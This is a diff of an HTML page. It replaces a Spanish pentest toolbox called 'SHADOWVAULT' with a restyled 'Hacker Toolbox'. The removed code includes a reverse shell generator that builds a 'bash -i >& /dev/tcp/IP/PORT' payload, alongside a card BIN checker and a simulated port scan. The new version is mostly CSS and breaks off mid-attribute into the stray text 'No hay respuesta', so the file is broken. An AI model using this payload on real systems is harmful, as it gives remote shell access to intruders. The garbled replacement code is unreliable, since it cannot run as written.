@@ -3,440 +3,355 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHADOWVAULT • Pentest Platform</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <title>Hacker Toolbox - Gemini in Firebase</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600&display=swap');
-        
         :root {
-            --accent: #00ff9d;
+            --bg-color: #0a0e17;
+            --card-bg-color: #1a1e27;
+            --accent-color: #00ff88; /* Green neon for accents */
+            --text-color: #e0e0e0;
+            --border-color: #333;
+            --input-bg-color: #2a2e37;
+            --input-border-color: #555;
+            --button-bg-color: #00b366;
+            --button-hover-bg-color: #00e673;
+            --shadow-color: rgba(0, 255, 136, 0.2);
+            --log-bg-color: #12151e;
+            --log-text-color: #00cc66;
+            --scrollbar-thumb: #00ff88;
+            --scrollbar-track: #2a2e37;
         }
+
         body {
-            font-family: 'Inter', system-ui, sans-serif;
+            font-family: 'Consolas', 'Monaco', monospace;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
-        .title-font {
-            font-family: 'Space Grotesk', sans-serif;
+
+        h1, h2, h3, h4, h5, h6 {
+            color: var(--accent-color);
+            margin-top: 0;
         }
-        .matrix-bg {
-            background: #0a0c12;
-            background-image: 
-                linear-gradient(rgba(0, 255, 157, 0.04) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 157, 0.04) 1px, transparent 1px);
-            background-size: 60px 60px;
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
         }
-        .neon-text {
-            text-shadow: 0 0 15px var(--accent),
-                        0 0 30px var(--accent);
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
         }
-        .card {
-            background: rgba(15, 23, 42, 0.85);
-            border: 1px solid rgba(0, 255, 157, 0.15);
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+
+        header h1 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px var(--accent-color);
+            margin-bottom: 10px;
         }
-        .card:hover {
-            border-color: rgba(0, 255, 157, 0.4);
-            transform: translateY(-6px);
-            box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 
-                       0 8px 10px -6px rgb(0 0 0 / 0.1);
+
+        .search-bar {
+            margin-bottom: 20px;
+            text-align: center;
         }
-        .terminal {
-            font-family: 'Space Grotesk', monospace;
-            background: #0a0c12;
-            border: 1px solid #00ff9d33;
+
+        .search-bar input {
+            width: 90%;
+            max-width: 500px;
+            padding: 10px 15px;
+            border: 1px solid var(--input-border-color);
+            border-radius: 5px;
+            background-color: var(--input-bg-color);
+            color: var(--text-color);
+            font-size: 1em;
+            box-shadow: 0 0 5px rgba(0, 255, 136, 0.3);
+            transition: all 0.3s ease;
         }
-        .tab-active {
-            color: #00ff9d;
-            border-bottom: 3px solid #00ff9d;
+
+        .search-bar input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 10px var(--accent-color);
+        }
+
+        .tabs {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .tab-button {
+            background-color: var(--card-bg-color);
+            color: var(--text-color);
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            margin: 0 5px 10px;
+            border-radius: 5px 5px 0 0;
+        }
+
+        .tab-button.active {
+            background-color: var(--accent-color);
+            color: var(--bg-color);
+            box-shadow: 0 0 8px var(--accent-color);
+        }
+
+        .tab-button:hover:not(.active) {
+            background-color: var(--input-bg-color);
+            color: var(--accent-color);
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .tool-card {
+            background-color: var(--card-bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            box-shadow: 0 0 15px var(--shadow-color);
+            padding: 20px;
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+
+        .tool-card.hidden {
+            display: none;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px var(--accent-color);
+        }
+
+        .tool-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .tool-header h3 {
+            margin: 0;
+            color: var(--accent-color);
+            font-size: 1.2em;
+        }
+
+        .tool-toggle-icon {
+            font-size: 1.5em;
+            color: var(--accent-color);
+        }
+
+        .tool-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+        }
+
+        .tool-card.expanded .tool-content {
+            max-height: 1000px; /* Adjust as needed */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-color);
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="date"],
+        textarea,
+        select {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid var(--input-border-color);
+            border-radius: 4px;
+            background-color: var(--input-bg-color);
+            color: var(--text-color);
+            font-size: 0.9em;
+            box-shadow: inset 0 0 3px rgba(0, 0, 0, 0.5);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        button {
+            background-color: var(--button-bg-color);
+            color: var(--bg-color);
+            border: none;
+            padding: 10px 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: var(--button-hover-bg-color);
+            box-shadow: 0 0 10px var(--accent-color);
+        }
+
+        .output-area {
+            background-color: var(--input-bg-color);
+            border: 1px solid var(--input-border-color);
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 15px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: var(--log-text-color);
+            font-size: 0.9em;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .output-area table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+
+        .output-area th, .output-area td {
+            border: 1px solid var(--input-border-color);
+            padding: 8px;
+            text-align: left;
+        }
+
+        .output-area th {
+            background-color: var(--border-color);
+            color: var(--accent-color);
+        }
+
+        .checkbox-group, .radio-group {
+            margin-bottom: 15px;
+        }
+
+        .checkbox-group label, .radio-group label {
+            display: inline-flex;
+            align-items: center;
+            margin-right: 15px;
+            margin-bottom: 5px;
+        }
+
+        .checkbox-group input[type="checkbox"],
+        .radio-group input[type="radio"] {
+            margin-right: 5px;
+            width: auto;
+            vertical-align: middle;
+        }
+
+        .qr-code-output img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin-top: 10px;
+            border: 1px solid var(--accent-color);
+            background-color: white;
+            padding: 5px;
+        }
+
+        .log-container {
+            background-color: var(--log-bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 30px;
+            box-shadow: 0 0 15px var(--shadow-color);
+            flex-grow: 1; /* Allow log to expand */
+        }
+
+        #activity-log {
+            height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-size: 0.85em;
+            color: var(--log-text-color);
+            background-color: transparent;
+            border: none;
+            padding: 0;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-color);
+            font-size: 0.9em;
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--scrollbar-track);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--scrollbar-thumb);
+            border-radius: 10px;
+            border: 2px solid var(--scrollbar-track);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--button-hover-bg-color);
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            .tool-grid {
+                grid-template-columns: 1fr;
+            }
+            .tab-button {
+                flex-grow: 1;
+                margin: 0 2px 5px;
+            }
         }
     </style>
 </head>
-<body class="matrix-bg text-slate-200 min-h-screen pb-20">
-    <div class="max-w-screen-2xl mx-auto">
+<body>
+    <div class="container">
+        <header>
+            <h1>Hacker Toolbox</h1>
+            <p>Herramientas de ciberseguridad para pruebas autorizadas y educación.</p>
+        </header>
 
-        <!-- TOP NAV -->
-        <nav class="bg-black/90 backdrop-blur-xl border-b border-[#00ff9d]/20 sticky top-0 z-50">
-            <div class="px-8 py-5 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-9 h-9 bg-[#00ff9d] text-black rounded-xl flex items-center justify-center font-bold text-2xl">SV</div>
-                    <div>
-                        <h1 class="title-font text-3xl tracking-tighter neon-text">SHADOWVAULT</h1>
-                        <p class="text-xs text-emerald-400 -mt-1">PENTEST FRAMEWORK • CLIENT-SIDE</p>
-                    </div>
-                </div>
-
-                <div class="flex items-center gap-6">
-                    <div class="relative w-96">
-                        <input id="globalSearch" 
-                               type="text" 
-                               placeholder="Buscar herramienta... (Ctrl+K)"
-                               class="w-full bg-zinc-950 border border-[#00ff9d]/30 focus:border-[#00ff9d] rounded-2xl px-5 py-3 text-sm outline-none">
-                        <i class="fas fa-search absolute right-5 top-3.5 text-[#00ff9d]/50"></i>
-                    </div>
-                    <button onclick="clearAllLogs()" 
-                            class="flex items-center gap-2 px-5 py-3 bg-zinc-900 hover:bg-red-950/50 border border-red-500/30 hover:border-red-500 rounded-2xl text-sm transition-colors">
-                        <i class="fas fa-trash"></i>
-                        <span>Limpiar</span>
-                    </button>
-                </div>
-            </div>
-
-            <!-- TABS -->
-            <div class="px-8 flex gap-8 text-sm font-medium border-t border-[#00ff9d]/10">
-                <button onclick="switchTab(0)" class="tab py-5 tab-active" data-tab="0">RECONOCIMIENTO</button>
-                <button onclick="switchTab(1)" class="tab py-5" data-tab="1">VALIDADORES</button>
-                <button onclick="switchTab(2)" class="tab py-5" data-tab="2">CODECS & HASH</button>
-                <button onclick="switchTab(3)" class="tab py-5" data-tab="3">GENERADORES</button>
-                <button onclick="switchTab(4)" class="tab py-5" data-tab="4">RED & REDES</button>
-            </div>
-        </nav>
-
-        <div class="flex">
-            <!-- LOG PANEL -->
-            <div class="w-80 bg-black/70 border-r border-[#00ff9d]/20 h-[calc(100vh-140px)] overflow-auto p-5 text-xs font-mono" id="activityLog">
-                <div class="flex items-center gap-2 text-emerald-400 mb-4">
-                    <i class="fas fa-terminal"></i>
-                    <span class="uppercase tracking-widest">Activity Log</span>
-                </div>
-            </div>
-
-            <!-- MAIN AREA -->
-            <div class="flex-1 p-8 overflow-auto" style="height: calc(100vh - 140px);">
-                
-                <!-- ==================== TAB 0: RECON ==================== -->
-                <div id="tab-0" class="tab-content grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
-                    <!-- BIN Checker -->
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3">
-                            <i class="fas fa-credit-card text-[#00ff9d]"></i> BIN / CARD CHECKER
-                        </h2>
-                        <input id="binInput" maxlength="19" placeholder="4111111111111111 o BIN" 
-                               class="w-full bg-zinc-950 border border-zinc-700 focus:border-[#00ff9d] rounded-2xl px-5 py-4 text-lg">
-                        <button onclick="checkBIN()" class="mt-4 w-full bg-[#00ff9d] hover:bg-emerald-400 text-black font-bold py-4 rounded-2xl transition">ANALIZAR TARJETA</button>
-                        <div id="binResult" class="terminal mt-5 p-5 text-sm min-h-[220px] rounded-2xl"></div>
-                    </div>
-
-                    <!-- Subnet Calculator -->
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3">
-                            <i class="fas fa-network-wired text-[#00ff9d]"></i> SUBNET CALCULATOR
-                        </h2>
-                        <div class="grid grid-cols-2 gap-4">
-                            <input id="subnetIP" value="192.168.10.0" class="bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
-                            <input id="subnetCIDR" value="/24" class="bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
-                        </div>
-                        <button onclick="calculateSubnet()" class="mt-6 w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">CALCULAR SUBRED</button>
-                        <div id="subnetResult" class="terminal mt-5 p-5 text-sm rounded-2xl"></div>
-                    </div>
-
-                    <!-- DNS Lookup -->
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3">
-                            <i class="fas fa-dns text-[#00ff9d]"></i> DNS LOOKUP
-                        </h2>
-                        <input id="dnsDomain" placeholder="google.com" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4 mb-4">
-                        <button onclick="dnsLookup()" class="w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">CONSULTAR DNS</button>
-                        <div id="dnsResult" class="terminal mt-5 p-5 text-sm max-h-64 overflow-auto rounded-2xl"></div>
-                    </div>
-                </div>
-
-                <!-- ==================== TAB 1: VALIDADORES ==================== -->
-                <div id="tab-1" class="tab-content hidden grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-university"></i> IBAN VALIDATOR</h2>
-                        <input id="ibanInput" placeholder="ES9121000418450200051332" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
-                        <button onclick="validateIBAN()" class="mt-4 w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">VALIDAR IBAN</button>
-                        <div id="ibanResult" class="terminal mt-5 p-5 rounded-2xl"></div>
-                    </div>
-
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-key"></i> JWT DECODER</h2>
-                        <textarea id="jwtInput" rows="4" placeholder="Pega tu JWT aquí..." class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-5 font-mono text-sm"></textarea>
-                        <button onclick="decodeJWT()" class="mt-4 w-full bg-[#00ff9d] text-black font-bold py-4 rounded-2xl">DECODIFICAR JWT</button>
-                        <div id="jwtResult" class="terminal mt-5 p-5 text-xs rounded-2xl overflow-auto max-h-80"></div>
-                    </div>
-                </div>
-
-                <!-- ==================== TAB 2: CODECS & HASH ==================== -->
-                <div id="tab-2" class="tab-content hidden">
-                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                        <div class="card rounded-3xl p-6">
-                            <h2 class="text-xl font-semibold mb-5">HASH GENERATOR</h2>
-                            <textarea id="hashInput" rows="3" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl p-5"></textarea>
-                            <div class="grid grid-cols-4 gap-3 mt-6">
-                                <button onclick="generateHash('SHA-256')" class="py-3 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">SHA-256</button>
-                                <button onclick="generateHash('SHA-512')" class="py-3 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">SHA-512</button>
-                                <button onclick="generateHash('MD5')" class="py-3 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">MD5</button>
-                            </div>
-                            <div id="hashOutput" class="terminal mt-6 p-6 text-sm break-all rounded-2xl"></div>
-                        </div>
-
-                        <div class="card rounded-3xl p-6">
-                            <h2 class="text-xl font-semibold mb-5">CODIFICADORES</h2>
-                            <input id="encodeInput" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4" placeholder="Texto a codificar">
-                            <div class="grid grid-cols-3 gap-3 mt-6">
-                                <button onclick="encodeBase64()" class="py-4 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">Base64</button>
-                                <button onclick="rot13()" class="py-4 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">ROT13</button>
-                                <button onclick="urlEncode()" class="py-4 bg-zinc-800 hover:bg-emerald-900 rounded-2xl">URL Encode</button>
-                            </div>
-                            <div id="encodeOutput" class="terminal mt-6 p-6 min-h-32 rounded-2xl"></div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- ==================== TAB 3: GENERADORES ==================== -->
-                <div id="tab-3" class="tab-content hidden grid grid-cols-1 lg:grid-cols-2 gap-6">
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5 flex items-center gap-3"><i class="fas fa-lock"></i> PASSWORD GENERATOR</h2>
-                        <div class="flex gap-4 items-center">
-                            <input id="passLength" type="number" value="20" class="w-24 text-center bg-zinc-950 border border-zinc-700 rounded-2xl py-4">
-                            <div class="flex gap-6">
-                                <label><input type="checkbox" id="incUpper" checked> Mayúsculas</label>
-                                <label><input type="checkbox" id="incLower" checked> Minúsculas</label>
-                                <label><input type="checkbox" id="incNum" checked> Números</label>
-                                <label><input type="checkbox" id="incSym" checked> Símbolos</label>
-                            </div>
-                        </div>
-                        <button onclick="generatePassword()" class="mt-6 w-full bg-[#00ff9d] text-black font-bold py-6 text-xl rounded-3xl">GENERAR CONTRASEÑA SEGURA</button>
-                        <div id="passwordOutput" onclick="copyToClipboard(this)" class="terminal mt-6 p-8 text-2xl text-center cursor-pointer rounded-3xl break-all"></div>
-                    </div>
-
-                    <div class="card rounded-3xl p-6">
-                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-terminal"></i> REVERSE SHELL GENERATOR</h2>
-                        <input id="revIP" value="10.0.0.5" class="w-full mb-4 bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
-                        <input id="revPort" value="4444" class="w-full mb-6 bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
-                        <button onclick="generateShell()" class="w-full bg-[#00ff9d] text-black font-bold py-5 rounded-3xl">GENERAR PAYLOAD</button>
-                        <pre id="shellOutput" class="terminal mt-6 p-6 text-xs overflow-auto max-h-80 rounded-3xl"></pre>
-                    </div>
-                </div>
-
-                <!-- ==================== TAB 4: RED ==================== -->
-                <div id="tab-4" class="tab-content hidden">
-                    <div class="card rounded-3xl p-6 max-w-2xl">
-                        <h2 class="text-xl font-semibold mb-5"><i class="fas fa-plug"></i> PORT SCANNER SIMULADO</h2>
-                        <input id="scanTarget" value="192.168.1.1" class="w-full bg-zinc-950 border border-zinc-700 rounded-2xl px-5 py-4">
-                        <button onclick="simulatePortScan()" class="mt-6 w-full bg-[#00ff9d] text-black font-bold py-5 rounded-3xl">INICIAR ESCANEO</button>
-                        <div id="scanResult" class="terminal mt-6 p-6 text-sm"></div>
-                    </div>
-                </div>
-            </div>
+        <div class="search-bar">
+            <input type="text" id="toolSearch" placeholder="Buscar herramienta...">
         </div>
-    </div>
 
-    <footer class="fixed bottom-0 left-0 right-0 bg-black/90 border-t border-[#00ff9d]/20 py-3 text-center text-xs text-emerald-400/70">
-        SHADOWVAULT • Solo para pruebas de penetración autorizadas y educación en ciberseguridad
-    </footer>
-
-    <script>
-        // ==================== UTILS ====================
-        function logActivity(msg, type = 'info') {
-            const log = document.getElementById('activityLog');
-            const time = new Date().toLocaleTimeString('es-ES', {hour:'2-digit', minute:'2-digit'});
-            const colors = {success: 'text-emerald-400', error: 'text-red-400', info: 'text-sky-400'};
-            log.innerHTML += `<div class="py-1 ${colors[type] || colors.info}">[${time}] ${msg}</div>`;
-            log.scrollTop = log.scrollHeight;
-        }
-
-        function copyToClipboard(el) {
-            navigator.clipboard.writeText(el.innerText);
-            const orig = el.style.backgroundColor;
-            el.style.backgroundColor = '#00ff9d22';
-            setTimeout(() => el.style.backgroundColor = orig, 400);
-            logActivity('Copiado al portapapeles', 'success');
-        }
-
-        function switchTab(n) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('tab-active'));
-            document.querySelectorAll(`button[data-tab="${n}"]`).forEach(t => t.classList.add('tab-active'));
-            
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
-            document.getElementById(`tab-${n}`).classList.remove('hidden');
-        }
-
-        function clearAllLogs() {
-            document.getElementById('activityLog').innerHTML = `<div class="flex items-center gap-2 text-emerald-400 mb-4"><i class="fas fa-terminal"></i><span class="uppercase tracking-widest">Activity Log</span></div>`;
-            logActivity('Log limpiado', 'success');
-        }
-
-        // ==================== HERRAMIENTAS ====================
-        const binDB = [
-            {bin:"411111", brand:"Visa", type:"Crédito", level:"Classic", bank:"Chase", country:"EE.UU"},
-            {bin:"510510", brand:"Mastercard", type:"Crédito", level:"Gold", bank:"Bank of America", country:"EE.UU"},
-            {bin:"340000", brand:"American Express", type:"Crédito", level:"Platinum", bank:"Amex", country:"EE.UU"},
-            {bin:"454000", brand:"Visa", type:"Débito", level:"Electron", bank:"Santander", country:"España"}
-        ];
-
-        function luhnCheck(num) {
-            num = num.replace(/\D/g,'');
-            let sum = 0, shouldDouble = false;
-            for (let i = num.length - 1; i >= 0; i--) {
-                let digit = parseInt(num[i]);
-                if (shouldDouble) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
-                sum += digit;
-                shouldDouble = !shouldDouble;
-            }
-            return sum % 10 === 0;
-        }
-
-        function checkBIN() {
-            const input = document.getElementById('binInput').value.trim();
-            if (!input) return;
-            const bin = input.substring(0,6);
-            const found = binDB.find(b => b.bin === bin);
-            const isValid = luhnCheck(input);
-
-            let html = `<strong>BIN:</strong> ${bin}<br><br>`;
-            if (found) {
-                html += `Marca: <span class="text-emerald-400">${found.brand}</span><br>`;
-                html += `Tipo: ${found.type}<br>`;
-                html += `Nivel: ${found.level}<br>`;
-                html += `Banco: ${found.bank}<br>`;
-                html += `País: ${found.country}<br><br>`;
-            }
-            html += `Luhn Algorithm: <span class="${isValid?'text-emerald-400':'text-red-400'} font-bold">${isValid ? 'VÁLIDA' : 'INVÁLIDA'}</span>`;
-            
-            document.getElementById('binResult').innerHTML = html;
-            logActivity(`BIN Checker: ${bin}`, isValid ? 'success' : 'error');
-        }
-
-        function calculateSubnet() {
-            const ip = document.getElementById('subnetIP').value;
-            const cidr = parseInt(document.getElementById('subnetCIDR').value.replace('/',''));
-            const result = document.getElementById('subnetResult');
-            
-            const totalHosts = Math.pow(2, 32 - cidr);
-            result.innerHTML = `
-                <strong>IP:</strong> ${ip}/${cidr}<br>
-                <strong>Hosts totales:</strong> ${totalHosts}<br>
-                <strong>Hosts utilizables:</strong> ${totalHosts - 2}<br>
-                <strong>Máscara:</strong> /${cidr}
-            `;
-            logActivity('Subnet Calculator ejecutado');
-        }
-
-        async function dnsLookup() {
-            const domain = document.getElementById('dnsDomain').value;
-            if (!domain) return;
-            const resDiv = document.getElementById('dnsResult');
-            resDiv.innerHTML = 'Consultando...';
-
-            try {
-                const resp = await fetch(`https://dns.google/resolve?name=${domain}&type=A`);
-                const data = await resp.json();
-                let html = '';
-                if (data.Answer) {
-                    data.Answer.forEach(a => html += `${a.data}<br>`);
-                } else {
-                    html = 'No se encontraron registros';
-                }
-                resDiv.innerHTML = html;
-                logActivity(`DNS Lookup: ${domain}`);
-            } catch(e) {
-                resDiv.innerHTML = 'Error de conexión';
-            }
-        }
-
-        async function generateHash(type) {
-            const text = document.getElementById('hashInput').value;
-            if (!text) return;
-            
-            let hash = '';
-            if (type === 'MD5') {
-                hash = 'MD5 no soportado nativamente en Web Crypto API';
-            } else {
-                const encoder = new TextEncoder();
-                const data = encoder.encode(text);
-                const hashBuffer = await crypto.subtle.digest(type, data);
-                hash = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2,'0')).join('');
-            }
-            document.getElementById('hashOutput').innerHTML = `<strong>${type}:</strong><br>${hash}`;
-            logActivity(`${type} generado`);
-        }
-
-        function encodeBase64() {
-            const input = document.getElementById('encodeInput').value;
-            document.getElementById('encodeOutput').textContent = btoa(unescape(encodeURIComponent(input)));
-            logActivity('Base64 codificado');
-        }
-
-        function rot13() {
-            const str = document.getElementById('encodeInput').value;
-            const result = str.replace(/[a-zA-Z]/g, c => {
-                return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
-            });
-            document.getElementById('encodeOutput').textContent = result;
-        }
-
-        function urlEncode() {
-            const input = document.getElementById('encodeInput').value;
-            document.getElementById('encodeOutput').textContent = encodeURIComponent(input);
-        }
-
-        function generatePassword() {
-            const length = parseInt(document.getElementById('passLength').value) || 16;
-            let chars = '';
-            if (document.getElementById('incLower').checked) chars += 'abcdefghijklmnopqrstuvwxyz';
-            if (document.getElementById('incUpper').checked) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            if (document.getElementById('incNum').checked) chars += '0123456789';
-            if (document.getElementById('incSym').checked) chars += '!@#$%^&*()_+';
-
-            let pass = '';
-            for (let i = 0; i < length; i++) {
-                pass += chars[Math.floor(Math.random() * chars.length)];
-            }
-            document.getElementById('passwordOutput').textContent = pass;
-            logActivity('Contraseña generada');
-        }
-
-        function generateShell() {
-            const ip = document.getElementById('revIP').value;
-            const port = document.getElementById('revPort').value;
-            const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-            document.getElementById('shellOutput').textContent = payload;
-            logActivity('Reverse Shell generado');
-        }
-
-        function simulatePortScan() {
-            const target = document.getElementById('scanTarget').value;
-            const html = `
-                <strong>Escaneo de ${target}</strong><br><br>
-                <span class="text-emerald-400">[80] HTTP - ABIERTO</span><br>
-                <span class="text-emerald-400">[443] HTTPS - ABIERTO</span><br>
-                <span class="text-amber-400">[22] SSH - FILTRADO</span><br>
-                <span class="text-red-400">[3389] RDP - CERRADO</span>
-            `;
-            document.getElementById('scanResult').innerHTML = html;
-            logActivity(`Port Scan simulado: ${target}`);
-        }
-
-        function validateIBAN() {
-            const iban = document.getElementById('ibanInput').value.replace(/\s/g,'').toUpperCase();
-            const valid = /^[A-Z]{2}[0-9]{2}/.test(iban);
-            document.getElementById('ibanResult').innerHTML = valid ? 
-                `<span class="text-emerald-400">✓ IBAN válido</span><br>${iban}` : 
-                `<span class="text-red-400">✗ IBAN inválido</span>`;
-        }
-
-        function decodeJWT() {
-            const jwt = document.getElementById('jwtInput').value.trim();
-            if (!jwt) return;
-            try {
-                const payload = JSON.parse(atob(jwt.split('.')[1]));
-                document.getElementById('jwtResult').innerHTML = `<pre>${JSON.stringify(payload, null, 2)}</pre>`;
-                logActivity('JWT decodificado');
-            } catch(e) {
-                document.getElementById('jwtResult').innerHTML = 'JWT inválido';
-            }
-        }
-
-        // Inicialización
-        window.onload = () => {
-            logActivity('SHADOWVAULT iniciado correctamente', 'success');
-            switchTab(0);
-        };
-    </script>
-</body>
-</html>
+        <div class="tabs">
+            <button class="tab-button active" data-category="all">Todas</button>
+            <button class="tab-button" data-category="recon">Reconocimiento</button>
+            <button class="tab-button" data-category="crypto">Criptografía</button>
+            <button class="tab-button" data-category="network">Redes</button>
+            <button class="tab-button" data-category="generatorsNo hay respuesta
